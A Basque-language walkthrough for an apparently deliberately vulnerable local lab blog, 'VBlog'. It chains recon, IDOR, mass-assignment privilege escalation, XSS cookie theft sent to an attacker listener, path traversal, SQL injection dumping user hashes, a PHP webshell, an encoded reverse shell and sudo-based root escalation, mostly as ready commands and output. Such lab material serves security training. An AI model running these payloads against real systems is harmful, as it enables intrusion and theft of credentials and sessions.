# VBlog — Gida

> Arkitektura: [arquitecture.md](arquitecture.md)

---

## Abiaraztea

```bash
cd VBlog
sudo docker compose up --build -d
```

Ireki `http://localhost` nabigatzailean.

---

## 0. Fasea — Errebistaketa

Ezkutuko bideak bilatu:
```bash
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50
```
> `/backup`, `/debug`, `/old`, `/internal`, `/admin` aurkitzen ditu

Agerian dauden kredentzialak irakurri:
```bash
curl http://localhost/backup
```
> Admin erabiltzailea, pasahitza eta BD kredentzialak testu arruntean itzultzen ditu

Aplikazioaren informazioa ikusi:
```bash
curl http://localhost/debug
```
> PHP bertsioa, BD kontrolatzailea eta erabiltzaile kopurua itzultzen ditu

Erabiltzaileak autentifikaziorik gabe enumeratu (IDOR):
```bash
for i in $(seq 1 55); do
  echo -n "id=$i: "
  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
done
```
> Admin id 52-n aurkitzen du: `"role":"admin"`

Ezkutuko azpidomeinuak bilatu:
```bash
gobuster vhost -u http://localhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 30
```
> `dev.vblog.local` aurkitzen du

Azpidomeinua gehitu eta barne-panela arakatu:
```bash
echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
```
> Ireki `http://dev.vblog.local/logs.html` nabigatzailean — PostgreSQL konexio-katea eta API eskaeretako trazeak

---

## 1. Fasea — Erregistratu eta saioa hasi

Kontu bat sortu:
```bash
curl -s -X POST http://localhost/api/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@test.com","passkey":"password123"}'
```
> `{"status":201,"message":"User created successfully"}`

Saioa hasi eta cookie-a gorde:
```bash
curl -s -c /tmp/cookies.txt -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","passkey":"password123"}'
```
> `{"status":200,"message":"Login correcto"}`

Uneko erabiltzailea eta rola ikusi:
```bash
curl -s -b /tmp/cookies.txt http://localhost/api/me
```
> `{"id":53,"name":"hacker","role":"user"}` — idatzi zure ID-a

---

## 2. Fasea — Admin-era eskalatu (Mass Assignment)

Zure rola admin-era aldatu (`53` zure ID-arekin ordeztu):
```bash
curl -s -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```
> `{"status":200,"user":{"role":"admin",...}}`

Admin zarela egiaztatu:
```bash
curl -s -b /tmp/cookies.txt http://localhost/api/me
```
> `{"role":"admin"}` — eskalada eginda

Administrazio-panelera sartu:
> Ireki `http://localhost/dashboard` nabigatzailean — sarbidea emanda rol egiaztaketarik gabe

---

## 3. Fasea — XSS + Barne-panela

XSS iruzkin batean injektatu (ordeztu `1` post ID baliozkoarekin):
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>alert(document.cookie)</script>"}'
```
> Ireki posta nabigatzailean — `alert()` exekutatzen da saio-cookiea erakutsiz

Bisitarien cookiea lapurtu — entzulea ireki:
```bash
python3 -m http.server 8888
```

Lapurtzeko payload-a injektatu (`ZURE_IP` ordeztu):
```bash
curl -s -b /tmp/cookies.txt -X POST http://localhost/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>fetch(\"http://ZURE_IP:8888/?c=\"+document.cookie)</script>"}'
```
> Entzuleak jasotzen du: `GET /?c=vblog-session=eyJ...`

Barne-panela arakatu:
> Ireki `http://dev.vblog.local/logs.html` — PostgreSQL konexio-kate osoa

---

## 4. Fasea — Path Traversal

Aplikazioaren `.env` fitxategia irakurri:
```bash
curl -s -b /tmp/cookies.txt "http://localhost/api/admin/file?path=.env"
```
> `APP_KEY`, `DB_PASSWORD` eta konfigurazio guztia itzultzen du

Sistemako fitxategiak irakurri:
```bash
curl -s -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../../etc/passwd"
```
> Edukiontziko `/etc/passwd` itzultzen du

---

## 5. Fasea — SQL Injection

Injekzioa egiaztatu:
```bash
curl -s -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter='" \
  -o /dev/null -w "HTTP %{http_code}\n"
```
> `HTTP 500` — PostgreSQL errorea, injekzioa baieztatuta

Denboran oinarritutako itssu injekzioarekin egiaztatu:
```bash
time curl -s -b /tmp/cookies.txt -G \
  --data-urlencode "filter=%' AND 1=(SELECT 1 FROM pg_sleep(3)) AND tags LIKE '%" \
  "http://localhost/api/admin/stats" -o /dev/null
```
> Erantzunak ~3 segundo behar ditu

Erabiltzaileen taula deskargatu:
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="$(grep vblog-session /tmp/cookies.txt | awk '{print $6"="$7}')" \
  --dbms=postgresql --level=3 --risk=2 --batch --dump -T users
```
> Erabiltzaile guztiak pasahitz-hashekin erauzten ditu

---

## 6. Fasea — Webshell igoera (RCE)

Webshell-a sortu eta igo:
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php

curl -s -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```
> `{"url":"http://localhost/avatars/shell.php"}`

Komandoak exekutatu:
```bash
curl -s "http://localhost/avatars/shell.php?cmd=$(echo -n 'id' | base64 -w0)"
```
> `uid=33(www-data) gid=33(www-data)`

---

## 7. Fasea — Reverse shell

Entzulea ireki (Terminal 1):
```bash
nc -lvnp 4444
```

Reverse shell bidali (Terminal 2):
```bash
curl "http://localhost/avatars/shell.php?cmd=cGhwIC1yICckcz1mc29ja29wZW4oIjE3Mi4xOC4wLjEiLDQ0NDQpOyRwPXByb2Nfb3BlbigiL2Jpbi9iYXNoIC1pIixhcnJheSgwPT4kcywxPT4kcywyPT4kcyksJHBpcGVzKTsn"
```
> Konexioa entzulerara iristen da — prompt gabeko shell motu bat

Shell-a hobetu (Terminal 1-en):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Sakatu `Ctrl+Z`, gero:
```bash
stty raw -echo; fg
```
Sakatu Enter bi aldiz.
> `www-data@edukiontzia:/var/www/html$` — shell interaktibo osoa

---

## 8. Fasea — Root-era eskalada

www-data-k root gisa zer exekuta dezakeen ikusi:
```bash
sudo -l
```
> `(root) NOPASSWD: /usr/bin/find`

A aukera — GTFOBins sudo find-ekin:
```bash
sudo find . -exec /bin/bash \; -quit
```
```bash
whoami
```
> `root`

B aukera — SUID bash:
```bash
/tmp/rootbash -p
whoami
```
> `root`

Root gisa arakatu:
```bash
id
cat /etc/shadow
ls -la /root
cat /root/.bash_history
```
> `uid=0(root) gid=0(root)` — edukiontziari kontrol osoa
